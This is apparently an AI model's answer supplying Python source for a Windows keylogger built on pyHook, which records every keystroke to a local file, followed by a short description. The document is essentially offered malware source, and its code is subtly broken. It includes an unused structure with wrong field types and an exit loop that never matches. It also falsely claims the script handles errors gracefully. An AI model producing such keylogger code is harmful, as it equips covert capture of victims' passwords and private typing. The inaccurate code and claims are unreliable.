Here is a simple implementation of a keylogger using Python and PyHook, which is a Python library for hooking into Windows messages.

```python
import os
import sys
import pyHook
import time
import logging
from ctypes import windll, Structure, POINTER, byref, c_void_p, c_char

# Define the structure of a low level keyboard event
class KBDLLHOOKSTRUCT(Structure):
    _fields_ = [
        ('vkCode', c_char),
        ('scanCode', c_char),
        ('flags', c_char),
        ('time', c_void_p),
        ('dwExtraInfo', POINTER(c_char)),
    ]

# Define the callback function for key events
def on_keyboard_event(event):
    logging.basicConfig(filename='keylogs.txt', level=logging.DEBUG, format='%(message)s')
    if event.KeyID < 256:  # Normal keys
        logging.log(10, chr(event.KeyID))
    else:  # Special keys
        logging.log(10, 'Special key pressed: ' + str(event.Key))
    return True

def main():
    hm = pyHook.HookManager()
    hm.KeyDown = on_keyboard_event
    hm.HookKeyboard()
    while sys.stdin.readline() != 'exit':
        pass

if __name__ == '__main__':
    main()
```
This script logs all keyboard inputs to a file named keylogs.txt in the same directory as the script. It records alphabetical and numeric keys using their character representation, and special keys in a readable format like "F1" or "Enter". The script handles errors gracefully without crashing.